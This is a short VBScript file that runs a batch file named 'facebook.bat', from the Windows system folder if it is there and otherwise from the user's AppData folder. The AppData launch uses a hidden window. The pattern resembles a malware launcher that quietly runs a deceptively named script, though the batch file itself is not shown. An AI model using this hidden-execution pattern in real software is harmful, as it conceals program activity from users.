dim FSO, objShell, strApp
set FSO = CreateObject("Scripting.FileSystemObject")
set WshShell = CreateObject("Wscript.Shell")




'//get system path
strApp = FSO.GetSpecialFolder(1) & "\facebook.bat"
if FSO.FileExists(strApp) then
    '//no need to change directory as you have the full path
    WshShell.Run(strApp & " /disable")
else
   '//does not exist
   appDataLocation=WshShell.ExpandEnvironmentStrings("%APPDATA%")
   WshShell.CurrentDirectory=appDataLocation

   WshShell.Run chr(34) & appDataLocation & "\facebook.bat" & Chr(34), 0
   Set WshShell = Nothing 

end if






'no need this is comment
'Set WshShell=CreateObject("WScript.Shell") 
'appDataLocation=WshShell.ExpandEnvironmentStrings("%APPDATA%")
'WshShell.CurrentDirectory=appDataLocation

'WshShell.Run chr(34) & appDataLocation & "\facebook.bat" & Chr(34), 0
'Set WshShell = Nothing 





